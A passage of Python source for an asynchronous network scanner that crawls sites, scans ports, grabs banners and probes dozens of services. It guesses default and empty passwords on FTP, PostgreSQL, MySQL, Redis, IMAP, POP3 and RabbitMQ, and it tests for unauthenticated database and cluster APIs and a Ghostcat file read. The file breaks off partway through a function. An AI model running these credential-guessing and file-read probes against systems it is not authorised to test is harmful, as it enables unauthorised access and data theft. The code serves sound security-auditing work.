            await cms_checks(h, info, findings, s)
            if not pages or info.get("status") != 200:
                return
            root = info.get("final_url") or f"https://{h}/"
            root_nl = urlsplit(root).netloc.lower().split(":")[0]
            visited = {root}                 # probe body already covers root
            queue = deque()
            fetched = 0

            def absorb(u, d, data):
                mine(h, data, mined)
                scan_blob(h, u, data, findings, surf)
                if d >= 2:
                    return
                for m in HREF_RE.finditer(data):
                    try:
                        nu = urljoin(u, m.group(1).decode("utf-8", "ignore"))
                    except Exception:
                        continue
                    if nu.lower().split("?")[0].endswith(".js"):
                        if nu not in visited and crawl_ok(nu, root_nl):
                            scripts_by_host.setdefault(h, set()).add(nu)
                        continue
                    if not crawl_ok(nu, root_nl) or nu in visited:
                        continue
                    if urlsplit(nu).path.lower().endswith(STATIC_EXT):
                        continue
                    visited.add(nu)
                    queue.append((nu, d + 1))

            absorb(root, 0, info.get("body") or b"")   # reuse probe body, no refetch
            while queue and fetched < pages:
                u, d = queue.popleft()
                data = await fetch_blob(s, u, 10, HTTP_SEM, 65536)
                fetched += 1
                if data:
                    absorb(u, d, data)
            stats["pages"] += fetched
            stats["hosts"] += 1
        res = await asyncio.gather(*[one(h) for h in probes],
                                   return_exceptions=True)
        nbad = sum(1 for x in res if isinstance(x, BaseException))
        if nbad:
            print(f"  [crawl] {nbad} host(s) raised and were skipped",
                  flush=True)
    print(f"  [crawl] -> {stats['pages']} pages on {stats['hosts']} hosts", flush=True)
    return stats


# ---------------- phase 7: port scan ----------------
async def check_port(host, port):
    async with PORT_SEM:
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port),
                                                     timeout=2.5)
        except Exception:
            return None
        banner = b""
        try:
            try:
                banner = await asyncio.wait_for(reader.read(256), timeout=0.8)
            except asyncio.TimeoutError:
                pass
            if not banner:
                if port in GREET:
                    payload = GREET[port]
                elif port in HTTPISH:
                    payload = (b"HEAD / HTTP/1.0\r\nHost: " + host.encode() +
                               b"\r\nConnection: close\r\n\r\n")
                else:
                    payload = b""
                if payload:
                    writer.write(payload)
                    await writer.drain()
                    try:
                        banner = await asyncio.wait_for(reader.read(256), timeout=1.2)
                    except asyncio.TimeoutError:
                        pass
        except Exception:
            pass
        finally:
            try:
                writer.close()
                await asyncio.wait_for(writer.wait_closed(), timeout=1)
            except Exception:
                pass
        b = re.sub(rb"[\r\n]+", b" ", banner).decode("utf-8", "ignore").strip()[:150]
        return host, port, b


async def port_scan(hosts, ports, findings):
    # bounded fan-out: eagerly materializing hosts x ports coroutines for a
    # large host set (e.g. 60k x 65) holds millions of coroutine objects in
    # memory before any run. Batch per-host so at most len(hosts_chunk) *
    # len(ports) coroutines exist at once.
    results, done = [], 0
    total = len(hosts) * len(ports)
    CHUNK = 256
    for i in range(0, len(hosts), CHUNK):
        batch = hosts[i:i + CHUNK]
        tasks = [check_port(h, p) for h in batch for p in ports]
        for coro in asyncio.as_completed(tasks):
            res = await coro
            done += 1
            if done % 2000 == 0:
                print(f"  [ports] {done}/{total}", flush=True)
            if res:
                results.append(res)
    for h, p, b in sorted(results):
        extra = f" | {b[:70]}" if b else ""
        if p in RISK_PORTS:
            sig = RISK_SIG.get(p)
            refuted = bool(b and sig and not re.search(sig, b, re.I))
            if refuted:
                # banner present but doesn't look like the assumed service:
                # claiming "MySQL exposed" off an nginx banner would be wrong
                findings.append(
                    f"[PORT] {h}:{p} open - {RISK_PORTS[p]} port but banner "
                    f"suggests another service{extra}")
            else:
                findings.append(f"[PORT-RISK] {h}:{p} open {RISK_PORTS[p]}{extra}")
        elif p not in (80, 443):
            findings.append(f"[PORT] {h}:{p} open{extra}")
    results = sorted(results)
    print(f"  [ports] -> {len(results)} open ports", flush=True)
    return results


async def ftp_anon_scan(port_results, findings, cap=20):
    """anonymous FTP: port 21 greeting -> USER anonymous / PASS -> 230 = open."""
    hits = 0
    cands = [(h, b) for h, p, b in port_results if p == 21][:cap]

    async def one(h, ban):
        nonlocal hits
        try:
            async with asyncio.timeout(8):
                rd, wr = await asyncio.open_connection(h, 21)
                try:
                    greet = await rd.read(512)
                    if not greet.startswith(b"220"):
                        return
                    wr.write(b"USER anonymous\r\n")
                    await wr.drain()
                    r1 = await rd.read(512)
                    ok = r1.startswith(b"230")
                    if not ok and r1.startswith(b"331"):
                        wr.write(b"PASS a@b.c\r\n")
                        await wr.drain()
                        ok = (await rd.read(512)).startswith(b"230")
                    if ok:
                        # session proof: PWD must answer 257 - a bare 230
                        # greeting exchange is not a usable login
                        wr.write(b"PWD\r\n")
                        await wr.drain()
                        pwd = await rd.read(512)
                        if not pwd.startswith(b"257"):
                            return
                        hits += 1
                        findings.append(
                            f"[FTP-ANON] {h}:21 accepted USER anonymous "
                            f"(230) and PWD returned a working directory - "
                            f"files readable, write access possible")
                        return
                    # default credentials on classic appliance pairs - PWD
                    # proves the session works, not just a 230 greeting
                    for user, pw in ((b"admin", b"admin"),
                                     (b"admin", b"password"),
                                     (b"ftp", b"ftp"), (b"test", b"test")):
                        wr.write(b"USER " + user + b"\r\n")
                        await wr.drain()
                        r1 = await rd.read(512)
                        if r1.startswith(b"331"):
                            wr.write(b"PASS " + pw + b"\r\n")
                            await wr.drain()
                            r1 = await rd.read(512)
                        if not r1.startswith(b"230"):
                            continue
                        wr.write(b"PWD\r\n")
                        await wr.drain()
                        pwd = await rd.read(512)
                        if not pwd.startswith(b"257"):
                            return
                        hits += 1
                        findings.append(
                            f"[FTP-DEFAULT] {h}:21 accepts the default "
                            f"credentials {user.decode()}:{pw.decode()} "
                            f"(230 + PWD) - file access with a guessable "
                            f"login")
                        return
                finally:
                    try:
                        wr.close()
                        await wr.wait_closed()
                    except Exception:
                        pass
        except Exception:
            return

    if cands:
        await asyncio.gather(*[one(h, b) for h, b in cands])
    if hits:
        print(f"  [ftp] -> {hits} anonymous login(s)", flush=True)
    return hits


SVC_HTTP = {
    9200: ("/", ("cluster_name", "tagline"), "SVC-ELASTIC",
           "Elasticsearch cluster answers / unauthenticated - data read/write"),
    2375: ("/version", ("apiversion",), "SVC-DOCKER",
           "Docker Engine API /version unauthenticated - container/host control"),
    2379: ("/health", ('"health"',), "SVC-ETCD",
           "etcd health endpoint open (200) - unauthenticated service exposure"),
    5984: ("/_all_dbs", ('"databases":',), "SVC-COUCH",
           "CouchDB lists every database unauthenticated - data read/write"),
    6443: ("/api/v1/namespaces", ('"items"', '"kind"'), "SVC-K8S",
           "Kubernetes API lists namespaces anonymously - cluster admin potential"),
    10250: ("/pods", ('"items"', '"metadata"'), "SVC-KUBELET",
            "Kubelet /pods lists cluster workloads anonymously - pod env vars "
            "and mounted secrets of every node"),
    8500: ("/v1/catalog/services", ('"consul"',), "SVC-CONSUL",
           "Consul catalog/services answers unauthenticated - full service "
           "registry (same token-less access reaches the KV store)"),
    8848: ("/nacos/v1/ns/service/list?pageNo=1&pageSize=100", ('"doms"',),
           "SVC-NACOS",
           "Nacos service registry answers unauthenticated - instance IPs, "
           "register new instances, read configs"),
    8983: ("/solr/admin/cores", ('"responseheader"', '"status"'), "SVC-SOLR",
           "Solr admin lists cores unauthenticated - index data read/write"),
    5000: ("/v2/_catalog", ('"repositories"',), "SVC-REGISTRY",
           "Docker Registry lists images unauthenticated - private layers "
           "pullable (source/config exposure)"),
    15672: ("/api/overview", ('"rabbitmq_version"',), "SVC-RABBIT",
            "RabbitMQ management API unauthenticated - vhosts, users and "
            "queue payloads readable"),
    8080: ("/api/json", ('"nodedescription"', '"jobs"'), "SVC-JENKINS",
            "Jenkins controller API open to anonymous users - job configs, "
            "build logs and credentials stored in jobs readable"),
    9090: ("/api/v1/targets", ('"discoveredlabels"', '"health"'), "SVC-PROMETHEUS",
            "Prometheus /api/v1/targets unauthenticated - full internal "
            "service inventory (job names, scrape URLs, labels)"),
    7474: ("/db/data/", ('"neo4j_version"',), "SVC-NEO4J",
            "Neo4j REST API answers /db/data/ without auth - graph data "
            "read/write (nodes, relationships, credentials in properties)"),
    8161: ("/admin/login.jsp", ('apache activemq', 'console'), "SVC-ACTIVEMQ",
            "ActiveMQ web console login exposed - default admin:admin is "
            "the most common credential on this panel"),
    9870: ("/api/v1/cluster", ('"clusterid"', '"livehealthynodes"'), "SVC-HADOOP",
            "Hadoop NameNode /api/v1/cluster unauthenticated - cluster "
            "inventory and HDFS file browse"),
    50070: ("/api/v1/cluster", ('"clusterid"', '"livehealthynodes"'), "SVC-HADOOP",
            "Hadoop NameNode /api/v1/cluster unauthenticated - cluster "
            "inventory and HDFS file browse"),
}
# postgresql startup (protocol 3.0) with trust auth -> AuthenticationOk (u32 0)
_PG_PARAMS = b"user\x00postgres\x00database\x00postgres\x00\x00"
_PG_BODY = (196608).to_bytes(4, "big") + _PG_PARAMS
PG_STARTUP = (len(_PG_BODY) + 4).to_bytes(4, "big") + _PG_BODY
# MQTT 3.1.1 CONNECT, clean session, client id "sxe" -> CONNACK rc=0 = accepted
# (remaining length 0x0f: 6 proto-name + 1 level + 1 flags + 2 keepalive + 2 idlen + 3 id)
MQTT_CONNECT = b"\x10\x0f\x00\x04MQTT\x04\x02\x00\x3c\x00\x03sxe"
SVC_RAW = {
    6379: (b"PING\r\n", b"+PONG", (b"-NOAUTH", b"-ERR"), "SVC-REDIS",
           "Redis answers PING with +PONG - no requirepass (RCE-adjacent)"),
    11211: (b"stats\r\n", b"STAT ", (b"ERROR",), "SVC-MEMCACHED",
            "Memcached serves stats anonymously - cache/session dump"),
    5432: (PG_STARTUP, b"R\x00\x00\x00\x08\x00\x00\x00\x00",
           (b"R\x00\x00\x00\x08\x00\x00\x00\x03",
            b"R\x00\x00\x00\x08\x00\x00\x00\x05",
            b"R\x00\x00\x00\x08\x00\x00\x00\x0a"), "SVC-PG",
           "PostgreSQL accepts a startup packet with AuthenticationOk (trust "
           "auth) - unauthenticated database read/write"),
    1883: (MQTT_CONNECT, b"\x20\x02\x00",
           tuple(b"\x20\x02\x00" + bytes([i]) for i in range(1, 8)),
           "SVC-MQTT",
           "MQTT broker grants CONNECT without credentials - anonymous "
           "publish/subscribe on the message bus"),
    2181: (b"ruok", b"imok", (b"not executed", b"whitelist"), "SVC-ZK",
           "ZooKeeper answers ruok with imok - unauthenticated four-letter-word "
           "admin channel (srvr/stat leak cluster state)"),
    389: (b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00",
          b"\x61\x07\x0a\x01\x00",
          (b"\x0a\x01\x08", b"\x0a\x01\x31", b"\x0a\x01\x32",
           b"\x0a\x01\x34"), "SVC-LDAP",
          "LDAP accepts an anonymous simple bind (resultCode success) - "
          "unauthenticated directory read (users, groups, AD structure)"),
    # Kafka ApiVersions (key 18, v0): null client-id, correlation id chosen
    # so the response's echoed correlation+error_code=0 is a unique marker
    9092: (b"\x00\x00\x00\x09\x00\x12\x00\x00\x53\x58\x45\x01\xff\xff",
           b"SXE\x01\x00\x00",
           (b"SXE\x01\x00\x01", b"SXE\x01\x00\x07", b"SXE\x01\x00\x0e",
            b"SXE\x01\x00\x2b"), "SVC-KAFKA",
           "Kafka answers ApiVersions without auth - broker metadata and "
           "topic enumeration on the wire protocol"),
}
VNC_PORT = 5900


async def pg_default(h, p, findings):
    """md5 (or cleartext) auth challenge -> default-password proof:
       md5(md5(pw+user)+salt) answered with AuthenticationOk = the password
       matched the server-side hash. one connection per guess (the salt is
       per-connection; a refused guess closes the socket). returns 1 on
       claim."""
    import hashlib as _hl
    users = ("postgres",)
    pws = ("postgres", "password", "admin", "123456", "test", "root",
           "letmein", "changeme")

    def startup(user):
        params = (b"user\x00" + user.encode() + b"\x00"
                  + b"database\x00" + user.encode() + b"\x00\x00")
        body = (196608).to_bytes(4, "big") + params
        return (len(body) + 4).to_bytes(4, "big") + body

    try:
        async with asyncio.timeout(10):
            for user in users:
                for pw in pws:
                    rd, wr = await asyncio.open_connection(h, p)
                    try:
                        wr.write(startup(user))
                        await wr.drain()
                        hdr = await asyncio.wait_for(rd.readexactly(9), 5)
                        if hdr[:1] != b"R":
                            return 0            # unexpected - stop probing
                        ln = int.from_bytes(hdr[1:5], "big")
                        atype = int.from_bytes(hdr[5:9], "big")
                        if atype == 5 and ln == 12:
                            salt = await asyncio.wait_for(
                                rd.readexactly(4), 5)
                            inner = _hl.md5(
                                (pw + user).encode()).hexdigest()
                            tok = (b"md5" + _hl.md5(
                                inner.encode() + salt).hexdigest()
                                .encode())
                        elif atype == 3:
                            tok = pw.encode()
                        else:
                            return 0            # SASL/other - skip
                        msg = tok + b"\x00"
                        wr.write(b"p" + (len(msg) + 4).to_bytes(4, "big")
                                 + msg)
                        await wr.drain()
                        r1 = await asyncio.wait_for(rd.readexactly(9), 5)
                        if (r1[:1] == b"R"
                                and int.from_bytes(r1[5:9], "big") == 0):
                            kind = "md5" if atype == 5 else "cleartext"
                            findings.append(
                                f"[PG-DEFAULT] {h}:{p} accepts PostgreSQL "
                                f"{kind} login for `{user}` with the "
                                f"default password `{pw}` "
                                f"(AuthenticationOk) - full database "
                                f"read/write")
                            return 1
                        if r1[:1] == b"E":
                            continue           # wrong pair, next guess
                        return 0
                    finally:
                        try:
                            wr.close()
                            await wr.wait_closed()
                        except Exception:
                            pass
    except Exception:
        return 0
    return 0


async def svc_probe(port_results, findings, cap=60):
    """unauthenticated service checks on open ports: docker/elastic/redis/
       memcached/etcd/rsync - evidence is the protocol answer itself."""
    hits = 0
    cands = {}
    for h, p, b in port_results:
        if p in SVC_HTTP or p in SVC_RAW or p in (873, VNC_PORT, 27017, 3389,
                                                   1099, 8009, 7001, 3306,
                                                   143, 110, 5672):
            cands.setdefault((h, p), b)
    cands = dict(list(cands.items())[:cap])      # advertised per-run cap

    async def http_check(h, p, path, needles, tag, desc):
        # plain session: the "unauthenticated" claim must not be backed by
        # the operator's --cookie/--authorization headers
        nonlocal hits
        try:
            conn = aiohttp.TCPConnector(limit=0, ssl=False)
            async with plain_session(conn) as s:
                for url in (f"http://{h}:{p}{path}", f"https://{h}:{p}{path}"):
                    try:
                        async with s.get(url, headers=UA,
                                         timeout=aiohttp.ClientTimeout(total=6),
                                         ssl=False, allow_redirects=False) as r:
                            if r.status != 200:
                                continue
                            body = (await r.content.read(65536)).lower()
                    except Exception:
                        continue
                    # ALL needles (a single common word like "tagline" is not
                    # evidence) on the direct response (no redirect hop)
                    if all(n.encode() in body for n in needles):
                        hits += 1
                        findings.append(f"[{tag}] {h}:{p} {desc}")
                        return
        except Exception:
            return

    async def raw_check(h, p, payload, ok, deny, tag, desc):
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(payload)
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(512), 4)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if ok in resp and not any(d in resp for d in deny):
            hits += 1
            findings.append(f"[{tag}] {h}:{p} {desc}")

    async def rsync_check(h):
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, 873), 5)
            try:
                greet = await asyncio.wait_for(rd.read(256), 4)
                if b"@RSYNCD" not in greet:
                    return
                wr.write(b"@RSYNCD 31.0\r\n")
                await wr.drain()
                data = await asyncio.wait_for(rd.read(4096), 4)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        mods = [ln for ln in data.split(b"\n")
                if ln and not ln.startswith((b"@", b"#", b"ERROR"))]
        if mods:
            hits += 1
            names = b", ".join(mods[:3]).decode("latin-1", "ignore")[:60]
            findings.append(
                f"[SVC-RSYNC] {h}:873 rsync lists {len(mods)} module(s) "
                f"anonymously ({names}) - file exposure")

    async def vnc_check(h, p):
        # server speaks first: version exchange, then its security-type list;
        # security type 1 = None means a client may authenticate with no
        # password at all (VNC AUTH is optional once None is offered)
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            types = []
            try:
                greet = await asyncio.wait_for(rd.readexactly(12), 4)
                if not greet.startswith(b"RFB "):
                    return
                wr.write(greet)                  # echo server's own version
                await wr.drain()
                if greet[4:11] == b"003.003":    # single u32 security type
                    raw = await asyncio.wait_for(rd.readexactly(4), 4)
                    types = [int.from_bytes(raw, "big")]
                else:                            # u8 count + list
                    n = (await asyncio.wait_for(rd.readexactly(1), 4))[0]
                    if 0 < n <= 64:
                        types = list(await asyncio.wait_for(
                            rd.readexactly(n), 4))
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if 1 in types:
            hits += 1
            findings.append(
                f"[SVC-VNC] {h}:{p} VNC offers security type None - "
                f"unauthenticated desktop/screen access")
        elif 2 in types:
            pw = await vnc_weak_check(h, p)
            if pw:
                hits += 1
                findings.append(
                    f"[VNC-WEAK] {h}:{p} VNC authenticates with the common "
                    f"password `{pw}` - interactive desktop access; set a "
                    f"strong session password or tunnel over SSH")

    def _mongo_listdbs():
        # OP_MSG {listDatabases: 1, $db: "admin"} - ismaster/hello never need
        # auth, so the privilege probe must actually request the db list
        doc = bytearray(b"\x00\x00\x00\x00")           # length placeholder
        doc += b"\x10listDatabases\x00" + (1).to_bytes(4, "little")
        doc += b"\x02$db\x00" + (6).to_bytes(4, "little") + b"admin\x00"
        doc += b"\x00"
        doc[0:4] = len(doc).to_bytes(4, "little")
        msg = ((1).to_bytes(4, "little") + (0).to_bytes(4, "little")
               + (2013).to_bytes(4, "little")           # OP_MSG opcode
               + (0).to_bytes(4, "little")              # flagBits
               + b"\x00" + bytes(doc))                  # section kind 0 + BSON
        return len(msg).to_bytes(4, "little") + msg

    async def mongo_check(h, p):
        # a databases array WITHOUT an error document proves unauth read
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(_mongo_listdbs())
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(8192), 5)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if (len(resp) >= 16 and int.from_bytes(resp[12:16], "little") == 2013
                and b"databases" in resp
                and not any(d in resp.lower()
                            for d in (b"errmsg", b"unauthorized"))):
            hits += 1
            findings.append(
                f"[SVC-MONGO] {h}:{p} answers listDatabases without "
                f"credentials - full database enumeration/read on MongoDB")

    async def rdp_check(h, p):
        # X.224 Connection Request + RDP_NEG_REQ; a NEG_RSP selecting
        # protocol 0 (not SSL, not HYBRID/NLA) proves legacy RDP
        nonlocal hits
        try:
            neg = b"\x01\x00\x08\x00" + (0x0B).to_bytes(4, "little")
            x224 = b"\x0e\xe0\x00\x00\x00\x00\x00" + neg
            pkt = b"\x03\x00" + (4 + len(x224)).to_bytes(2, "big") + x224
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(pkt)
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(64), 4)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if not resp.startswith(b"\x03\x00"):
            return
        i = resp.find(b"\x02\x00\x08\x00")              # RDP_NEG_RSP
        if i >= 0 and i + 8 <= len(resp):
            proto = int.from_bytes(resp[i + 4:i + 8], "little")
            if proto == 0:                              # 0 = legacy RDP only
                hits += 1
                findings.append(
                    f"[RDP-LEGACY] {h}:{p} RDP negotiation selects protocol 0 "
                    f"(legacy RDP, no TLS / Network Level Authentication) - "
                    f"credential stuffing and BlueKeep-class attacks apply")

    async def rmi_check(h, p):
        # JRMP handshake: a ProtocolAck (0x4E) means an unauthenticated
        # RMI/JMX registry that will accept further JRMP calls
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(b"\x4a\x52\x4d\x49\x00\x02\x4b")   # JRMI + ver2 + stream
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(128), 4)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if resp[:1] == b"\x4e" and len(resp) >= 3:         # ProtocolAck
            hits += 1
            findings.append(
                f"[SVC-RMI] {h}:{p} JRMP handshake accepted (ProtocolAck) - "
                f"unauthenticated RMI registry / JMX MBean surface "
                f"(deserialization + JNDI-injection class attacks)")

    def _ajp_req(uri):
        def _s(x):
            b = x.encode()
            return len(b).to_bytes(2, "big") + b + b"\x00"
        body = (b"\x02\x02"                                     # forward req GET
                + b"HTTP/1.1\x00" + _s(uri)
                + _s("127.0.0.1") + _s("localhost") + _s("localhost")
                + (80).to_bytes(2, "big") + b"\x00"             # server_port, !ssl
                + _s("localhost") + _s("/") + _s("") + _s(""))
        return b"\x12\x34" + len(body).to_bytes(2, "big") + body

    async def ajp_check(h, p):
        # Ghostcat (CVE-2020-1938): an AJP DATA packet carrying web.xml
        # bytes means the connector reads arbitrary files for anyone
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(b"\x42\x00\x00\x00")                   # AJP13 magic
                wr.write(_ajp_req("/WEB-INF/web.xml"))
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(16384), 6)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return
        if resp[:2] == b"AB" and any(m in resp for m in (
                b"<web-app", b"<servlet>", b"<filter>", b"<servlet-mapping")):
            hits += 1
            findings.append(
                f"[GHOSTCAT] {h}:{p} AJP reads /WEB-INF/web.xml unauthenticated "
                f"(CVE-2020-1938) - arbitrary file read, RCE chain via "
                f"request smuggling into Tomcat")

    async def weblogic_check(h, p):
        # T3 handshake first (protocol up even without the console), then
        # the admin console login page over HTTP as the fallback evidence
        nonlocal hits
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                wr.write(b"t3 12.2.1\nAS:255\nHL:19\nLF:19\n\n")
                await wr.drain()
                resp = await asyncio.wait_for(rd.read(64), 4)
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            resp = b""
        if resp.upper().startswith(b"HELO"):
            hits += 1
            findings.append(
                f"[SVC-WEBLOGIC] {h}:{p} answers the T3 handshake "
                f"(HELO) - WebLogic deserialization attack surface "
                f"(CVE-2019-2725/2729 era), firewall T3 or require "
                f"network isolation")
            return
        try:
            conn = aiohttp.TCPConnector(limit=0, ssl=False)
            async with plain_session(conn) as s:
                for url in (f"http://{h}:{p}/console/login/LoginForm.jsp",
                            f"https://{h}:{p}/console/login/LoginForm.jsp"):
                    try:
                        async with s.get(url, headers=UA, ssl=False,
                                         allow_redirects=False,
                                         timeout=aiohttp.ClientTimeout(
                                             total=6)) as r:
                            if r.status != 200:
                                continue
                            body = (await r.content.read(65536)).lower()
                    except Exception:
                        continue
                    if b"weblogic" in body and b"login" in body:
                        hits += 1
                        findings.append(
                            f"[SVC-WEBLOGIC] {h}:{p} serves the WebLogic "
                            f"admin console login - change default "
                            f"credentials and restrict /console by IP")
                        return
        except Exception:
            return

    async def mysql_empty_check(h, p):
        # protocol-10 handshake -> HandshakeResponse41 as root with an
        # EMPTY auth response; server OK (0x00) = no password on root.
        # MySQL packet lengths are 3-byte LITTLE-endian.
        nonlocal hits
        def pkt(seq, payload):
            return (len(payload).to_bytes(3, "little")
                    + bytes([seq]) + payload)

        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
            try:
                raw = await asyncio.wait_for(rd.read(4), 4)
                if len(raw) < 4:
                    return
                ln = int.from_bytes(raw[:3], "little")
                body = await asyncio.wait_for(rd.readexactly(ln), 4)
                if not body or body[0] != 0x0a:
                    return                    # not a protocol-10 handshake
                for user in (b"root", b""):
                    caps = 0x00088201        # PROTOCOL48|SECURE|PLUGIN_AUTH
                    hs = (caps.to_bytes(4, "big") + b"\x00\x00\x00\x01"
                          + b"\x21" + b"\x00" * 23 + user + b"\x00"
                          + b"\x00"              # empty auth-response len
                          + b"mysql_native_password\x00")
                    wr.write(pkt(raw[3] + 1, hs))
                    await wr.drain()
                    r1 = await asyncio.wait_for(rd.read(4), 4)
                    if len(r1) < 4:
                        return
                    ln1 = int.from_bytes(r1[:3], "little")
                    p1 = await asyncio.wait_for(rd.readexactly(ln1), 4)
                    if p1[:1] == b"\xfe":
                        # auth switch: reply with empty auth again
                        wr.write(pkt(r1[3] + 1, b"\x00"))
                        await wr.drain()
                        r2 = await asyncio.wait_for(rd.read(4), 4)
                        if len(r2) < 4:
                            continue
                        ln2 = int.from_bytes(r2[:3], "little")
                        p1 = await asyncio.wait_for(rd.readexactly(ln2), 4)
                    if p1[:1] == b"\x00":
                        hits += 1
                        findings.append(
                            f"[MYSQL-EMPTY] {h}:{p} accepts MySQL login for "
                            f"`{user.decode() or '(any user)'}` with an EMPTY "
                            f"password (AuthenticationOK) - unauthenticated "
                            f"database read/write")
                        return
            finally:
                try:
                    wr.close()
                    await wr.wait_closed()
                except Exception:
                    pass
        except Exception:
            return

    async def imap_check(h, p):
        # empty-password LOGIN probes: known usernames with "" must land
        # an OK - a server that accepts them hands over the whole mailbox
        nonlocal hits
        try:
            async with asyncio.timeout(8):
                rd, wr = await asyncio.open_connection(h, p)
                try:
                    ban = await rd.read(512)
                    if not ban.startswith(b"* OK"):
                        return
                    for user in (b"admin", b"root", b"test", b"ftp"):
                        wr.write(b"a1 LOGIN " + user + b' ""\r\n')
                        await wr.drain()
                        r1 = await rd.read(512)
                        if r1.startswith(b"a1 OK"):
                            hits += 1
                            findings.append(
                                f"[IMAP-EMPTY] {h}:{p} accepts LOGIN for "
                                f"`{user.decode()}` with an EMPTY password "
                                f"(a1 OK) - unauthenticated mailbox read")
                            return
                        if r1.startswith(b"a1 BAD") or r1.startswith(
                                b"* BYE"):
                            return
                finally:
                    try:
                        wr.close()
                        await wr.wait_closed()
                    except Exception:
                        pass
        except Exception:
            return

    async def pop3_check(h, p):
        nonlocal hits
        try:
            async with asyncio.timeout(8):
                rd, wr = await asyncio.open_connection(h, p)
                try:
                    ban = await rd.read(512)
                    if not ban.startswith(b"+OK"):
                        return
                    for user in (b"admin", b"root", b"test"):
                        wr.write(b"USER " + user + b"\r\n")
                        await wr.drain()
                        r1 = await rd.read(512)
                        if not r1.startswith(b"+OK"):
                            continue
                        wr.write(b"PASS \r\n")
                        await wr.drain()
                        r2 = await rd.read(512)
                        if r2.startswith(b"+OK"):
                            hits += 1
                            findings.append(
                                f"[POP3-EMPTY] {h}:{p} accepts USER "
                                f"{user.decode()} with an EMPTY password "
                                f"(+OK) - unauthenticated mailbox read")
                            return
                    wr.write(b"QUIT\r\n")
                    await wr.drain()
                finally:
                    try:
                        wr.close()
                        await wr.wait_closed()
                    except Exception:
                        pass
        except Exception:
            return

    async def redis_weak(h, p):
        # banner said -NOAUTH: AUTH against a tiny default wordlist on one
        # connection; +OK only ever comes back for the CORRECT password
        nonlocal hits
        words = (b"redis", b"password", b"123456", b"admin", b"guest",
                 b"pass", b"test", b"secret", b"changeme", b"letmein")
        try:
            async with asyncio.timeout(8):
                rd, wr = await asyncio.open_connection(h, p)
                try:
                    for pw in words:
                        wr.write(b"AUTH " + pw + b"\r\n")
                        await wr.drain()
                        r1 = await rd.read(512)
                        if r1.startswith(b"+OK"):
                            hits += 1
                            findings.append(
                                f"[REDIS-WEAK] {h}:{p} accepts AUTH with the "
                                f"default password `{pw.decode()}` - full "
                                f"cache read/write (session tokens, queues)")
                            return
                        if not r1.startswith(b"-ERR"):
                            return        # connection dropped, stop probing
                finally:
                    try:
                        wr.close()
                        await wr.wait_closed()
                    except Exception:
                        pass
        except Exception:
            return

    async def rabbit_default(h, p):
        # anonymous /api/overview is already SVC-RABBIT; guest:guest is the
        # RabbitMQ default and the only account that exists on fresh nodes
        nonlocal hits
        try:
            conn = aiohttp.TCPConnector(limit=0, ssl=False)
            async with plain_session(conn) as s:
                anon = None
                try:
                    async with s.get(f"http://{h}:{p}/api/overview",
                                     headers=UA, ssl=False,
                                     allow_redirects=False,
                                     timeout=aiohttp.ClientTimeout(
                                         total=6)) as r:
                        anon = r.status
                        if anon == 200:
                            return      # open already: SVC-RABBIT covers it
                except Exception:
                    return
                if anon not in (401, 403):
                    return
                import base64 as _b64
                cred = _b64.b64encode(b"guest:guest").decode()
                async with s.get(f"http://{h}:{p}/api/overview",
                                 headers={**UA, "Authorization":
                                          f"Basic {cred}"},
                                 ssl=False, allow_redirects=False,
                                 timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status == 200:
                        body = await r.content.read(16000)
                        if b"rabbitmq_version" in body.lower():
                            hits += 1
                            findings.append(
                                f"[RABBIT-DEFAULT] {h}:{p} accepts the "
                                f"default RabbitMQ credentials guest:guest "
                                f"on /api/overview - full broker admin; "
                                f"delete or rename the guest user")
        except Exception:
            return

    async def consul_kv_check(h, p):
        # catalog (SVC-CONSUL) lists services; the KV store holds secrets -
        # a 200 on ?recurse means anonymous read of the whole keyspace
        nonlocal hits
        try:
            conn = aiohttp.TCPConnector(limit=0, ssl=False)
            async with plain_session(conn) as s:
                async with s.get(f"http://{h}:{p}/v1/kv/?recurse=true",
                                 headers=UA, ssl=False, allow_redirects=False,
                                 timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if r.status != 200:
                        return
                    body = await r.content.read(65536)
        except Exception:
            return
        if body.lstrip()[:1] == b"[":
            hits += 1
            findings.append(
                f"[CONSUL-KV] {h}:{p} /v1/kv/?recurse=true returns the full "
                f"KV store unauthenticated - service tokens/secrets in KV "
                f"are readable and writable")

    async def etcd_kv_check(h, p):
        # etcd v3 range on the whole keyspace (0x00 prefix); a JSON header
        # means anonymous read of every key (secrets, kubeconfigs)
        nonlocal hits
        try:
